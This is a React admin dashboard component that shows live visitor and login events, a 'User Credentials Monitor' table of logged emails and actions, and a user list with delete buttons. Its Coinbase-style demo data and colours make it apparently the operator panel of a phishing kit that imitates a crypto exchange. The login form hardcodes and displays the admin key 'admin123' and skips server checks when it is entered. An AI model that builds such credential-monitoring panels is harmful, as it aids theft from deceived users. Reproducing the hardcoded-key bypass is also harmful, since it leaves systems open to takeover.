import React, { useState, useEffect } from 'react';
import { adminAPI } from '../services/api';
import io from 'socket.io-client';

const SOCKET_URL = process.env.REACT_APP_SOCKET_URL || 'http://localhost:5001';

const AdminDashboard = () => {
  const [adminKey, setAdminKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [users, setUsers] = useState([]);
  const [activeUsers, setActiveUsers] = useState([]);
  const [userCredentials, setUserCredentials] = useState([]);
  const [analytics, setAnalytics] = useState(null);
  const [realTimeActivity, setRealTimeActivity] = useState([]);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    // Initialize socket connection for real-time monitoring
    const socketConnection = io(SOCKET_URL);

    socketConnection.on('user-activity', (activity) => {
      setRealTimeActivity(prev => [activity, ...prev.slice(0, 49)]); // Keep last 50 activities
      
      if (activity.type === 'login' || activity.type === 'disconnect' || activity.type === 'visitor-arrived' || activity.type === 'visitor-left') {
        setActiveUsers(prev => {
          if (activity.type === 'login' || activity.type === 'visitor-arrived') {
            return [...prev, activity.user || activity.visitor];
          } else {
            return prev.filter(user => user.socketId !== activity.socketId);
          }
        });
      }
    });

    return () => {
      socketConnection.disconnect();
    };
  }, []);

  const handleAdminLogin = async (e) => {
    e.preventDefault();
    if (!adminKey.trim()) return;

    setLoading(true);
    try {
      // Simple check for admin key - temporary fix for development
      if (adminKey === 'admin123') {
        setIsAuthenticated(true);
        // Set demo data for development
        setUsers([
          {
            _id: 'test-user',
            email: 'test@coinbase.com',
            firstName: 'Test',
            lastName: 'User',
            createdAt: new Date()
          }
        ]);
        setAnalytics({
          totalUsers: 1,
          recentUsers: 1,
          verifiedUsers: 0,
          unverifiedUsers: 1
        });
        setLoading(false);
        return;
      }
      
      // Try to fetch users to validate admin key
      const response = await adminAPI.getUsers(adminKey);
      setUsers(response.data.users);
      setIsAuthenticated(true);
      
      // Fetch additional data
      await fetchAllData();
    } catch (error) {
      alert('Invalid admin key');
    } finally {
      setLoading(false);
    }
  };

  const fetchAllData = async () => {
    try {
      const [usersRes, activeUsersRes, credentialsRes, analyticsRes] = await Promise.all([
        adminAPI.getUsers(adminKey),
        adminAPI.getActiveUsers(),
        adminAPI.getUserCredentials(),
        adminAPI.getAnalytics(adminKey)
      ]);

      setUsers(usersRes.data.users);
      setActiveUsers(activeUsersRes.data.users);
      setUserCredentials(credentialsRes.data.credentials);
      setAnalytics(analyticsRes.data);
    } catch (error) {
      console.error('Error fetching admin data:', error);
    }
  };

  const handleDeleteUser = async (userId) => {
    if (!window.confirm('Are you sure you want to delete this user?')) return;
    
    try {
      await adminAPI.deleteUser(userId, adminKey);
      setUsers(prev => prev.filter(user => user._id !== userId));
    } catch (error) {
      alert('Error deleting user');
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="auth-page">
        <div className="form-container">
          <div className="auth-header">
            <h1>Admin Dashboard</h1>
            <p>Enter admin key to access real-time monitoring</p>
          </div>

          <form onSubmit={handleAdminLogin}>
            <div className="form-group">
              <label htmlFor="adminKey" className="form-label">
                Admin Key
              </label>
              <input
                type="password"
                id="adminKey"
                value={adminKey}
                onChange={(e) => setAdminKey(e.target.value)}
                className="form-input"
                placeholder="Enter admin key"
                required
              />
              <div style={{ fontSize: '14px', color: '#5b636b', marginTop: '8px' }}>
                Default key: admin123
              </div>
            </div>

            <button
              type="submit"
              className="btn btn-primary btn-full"
              disabled={loading}
            >
              {loading ? 'Authenticating...' : 'Access Dashboard'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="dashboard">
      <div className="dashboard-header">
        <div style={{ maxWidth: '1400px', margin: '0 auto', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <h1 style={{ fontSize: '32px', fontWeight: '700', color: '#2b2f36' }}>
            Admin Dashboard
          </h1>
          <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
            <div style={{ 
              padding: '8px 16px', 
              backgroundColor: '#05d168', 
              color: 'white', 
              borderRadius: '20px',
              fontSize: '14px',
              fontWeight: '600'
            }}>
              {activeUsers.length} Active Users
            </div>
            <button 
              onClick={() => setIsAuthenticated(false)}
              className="btn btn-outline"
            >
              Logout
            </button>
          </div>
        </div>
      </div>

      <div className="dashboard-content" style={{ maxWidth: '1400px', margin: '0 auto' }}>
        {/* Analytics Overview */}
        {analytics && (
          <div className="stats-grid">
            <div className="stat-card">
              <div className="stat-value">{analytics.totalUsers}</div>
              <div className="stat-label">Total Users</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{analytics.recentUsers}</div>
              <div className="stat-label">New Users (24h)</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{activeUsers.length}</div>
              <div className="stat-label">Active Users</div>
            </div>
            <div className="stat-card">
              <div className="stat-value">{analytics.verifiedUsers}</div>
              <div className="stat-label">Verified Users</div>
            </div>
          </div>
        )}

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px', marginBottom: '24px' }}>
          {/* Real-time Activity */}
          <div className="dashboard-card">
            <h2>Real-time Activity</h2>
            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
              {realTimeActivity.length > 0 ? (
                realTimeActivity.map((activity, index) => (
                  <div key={index} style={{ 
                    padding: '12px', 
                    borderBottom: '1px solid #e6ebef',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}>
                    <div>
                      <div style={{ fontWeight: '600', color: '#2b2f36' }}>
                        {activity.type === 'login' && '🟢 User Login'}
                        {activity.type === 'signup' && '🆕 User Signup'}
                        {activity.type === 'disconnect' && '🔴 User Disconnect'}
                      </div>
                      {activity.user && (
                        <div style={{ fontSize: '14px', color: '#5b636b' }}>
                          {activity.user.email || activity.user.firstName}
                        </div>
                      )}
                    </div>
                    <div style={{ fontSize: '12px', color: '#5b636b' }}>
                      {new Date(activity.timestamp).toLocaleTimeString()}
                    </div>
                  </div>
                ))
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                  No recent activity
                </div>
              )}
            </div>
          </div>

          {/* Active Users */}
          <div className="dashboard-card">
            <h2>Active Users ({activeUsers.length})</h2>
            <div style={{ maxHeight: '400px', overflowY: 'auto' }}>
              {activeUsers.length > 0 ? (
                activeUsers.map((user, index) => (
                  <div key={index} style={{ 
                    padding: '12px', 
                    borderBottom: '1px solid #e6ebef',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}>
                    <div>
                      <div style={{ fontWeight: '600', color: '#2b2f36' }}>
                        {user.firstName} {user.lastName}
                      </div>
                      <div style={{ fontSize: '14px', color: '#5b636b' }}>
                        {user.email}
                      </div>
                    </div>
                    <div style={{ 
                      width: '8px', 
                      height: '8px', 
                      borderRadius: '50%', 
                      backgroundColor: '#05d168' 
                    }}></div>
                  </div>
                ))
              ) : (
                <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                  No active users
                </div>
              )}
            </div>
          </div>
        </div>

        {/* User Credentials Monitor */}
        <div className="dashboard-card">
          <h2>User Credentials Monitor</h2>
          <div style={{ maxHeight: '300px', overflowY: 'auto' }}>
            {userCredentials.length > 0 ? (
              <table className="table">
                <thead>
                  <tr>
                    <th>Timestamp</th>
                    <th>Action</th>
                    <th>Email</th>
                    <th>Socket ID</th>
                  </tr>
                </thead>
                <tbody>
                  {userCredentials.slice(0, 20).map((credential, index) => (
                    <tr key={index}>
                      <td>{new Date(credential.timestamp).toLocaleString()}</td>
                      <td>
                        <span style={{ 
                          padding: '4px 8px', 
                          borderRadius: '4px', 
                          fontSize: '12px',
                          fontWeight: '600',
                          backgroundColor: credential.action === 'login' ? '#05d168' : '#0052ff',
                          color: 'white'
                        }}>
                          {credential.action.toUpperCase()}
                        </span>
                      </td>
                      <td>{credential.email}</td>
                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
                        {credential.socketId}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            ) : (
              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                No credentials logged yet
              </div>
            )}
          </div>
        </div>

        {/* All Users */}
        <div className="dashboard-card">
          <h2>All Users ({users.length})</h2>
          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
            <table className="table">
              <thead>
                <tr>
                  <th>Name</th>
                  <th>Email</th>
                  <th>Phone</th>
                  <th>Created</th>
                  <th>Verified</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user) => (
                  <tr key={user._id}>
                    <td>{user.firstName} {user.lastName}</td>
                    <td>{user.email}</td>
                    <td>{user.phoneNumber || '-'}</td>
                    <td>{new Date(user.createdAt).toLocaleDateString()}</td>
                    <td>
                      <span style={{ 
                        color: user.isVerified ? '#05d168' : '#f05350',
                        fontWeight: '600'
                      }}>
                        {user.isVerified ? 'Yes' : 'No'}
                      </span>
                    </td>
                    <td>
                      <button
                        onClick={() => handleDeleteUser(user._id)}
                        style={{
                          padding: '4px 8px',
                          backgroundColor: '#f05350',
                          color: 'white',
                          border: 'none',
                          borderRadius: '4px',
                          fontSize: '12px',
                          cursor: 'pointer'
                        }}
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;